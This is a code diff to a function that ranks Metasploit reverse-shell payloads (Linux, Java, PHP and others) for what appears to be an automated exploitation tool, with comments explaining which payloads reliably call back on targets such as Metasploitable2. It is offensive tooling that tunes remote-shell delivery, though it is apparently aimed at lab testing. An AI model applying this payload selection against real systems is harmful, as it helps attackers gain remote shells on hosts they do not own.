@@ -1353,14 +1353,18 @@ def _payload_prefs(platform, x64):
             "windows/shell_reverse_tcp",
         ]
     elif platform == "linux":
+        # Unstaged (shell_reverse_tcp) before staged (shell/reverse_tcp): one self-
+        # contained payload with no stager round-trip is more reliable on old targets
+        # and, critically, on upload-and-exec modules like mysql_udf_payload, where the
+        # staged variant's stager is what MSF rejects at execute (returns no uuid).
         if x64:
             prefs += [
-                "linux/x64/shell/reverse_tcp",
                 "linux/x64/shell_reverse_tcp",
+                "linux/x64/shell/reverse_tcp",
             ]
         prefs += [
-            "linux/x86/shell/reverse_tcp",
             "linux/x86/shell_reverse_tcp",
+            "linux/x86/shell/reverse_tcp",
         ]
     elif platform == "osx":
         prefs += [
@@ -1382,14 +1386,17 @@ def _payload_prefs(platform, x64):
             "cmd/unix/reverse_bash",
         ]
     elif platform == "java":
-        # java targets deliver a JVM payload, so the generic and native
-        # command shells below never produce a session here; the working java
-        # payloads must rank ahead of them. Command shell first per the
-        # shell-over-meterpreter preference, with java meterpreter (what msf
-        # itself defaults to for these modules) as the java fallback.
-        prefs += ["java/shell/reverse_tcp", "java/shell_reverse_tcp",
-                  "java/jsp_shell_reverse_tcp",
-                  "java/meterpreter/reverse_tcp"]
+        # java targets deliver a JVM payload, so the generic and native command
+        # shells below never produce a session here; the working java payloads must
+        # rank ahead of them. The shell-over-meterpreter preference is INVERTED for
+        # java on purpose: the staged java/shell/reverse_tcp fires but never calls
+        # back on old JVMs (Metasploitable2's java_rmi_server is the case), while
+        # java/meterpreter/reverse_tcp - what msf itself defaults to for these
+        # modules - reliably opens. Meterpreter first here, staged/jsp shells after
+        # as fallbacks.
+        prefs += ["java/meterpreter/reverse_tcp",
+                  "java/shell/reverse_tcp", "java/shell_reverse_tcp",
+                  "java/jsp_shell_reverse_tcp"]
     elif platform == "php":
         prefs += ["php/reverse_php"]
     elif platform == "python":
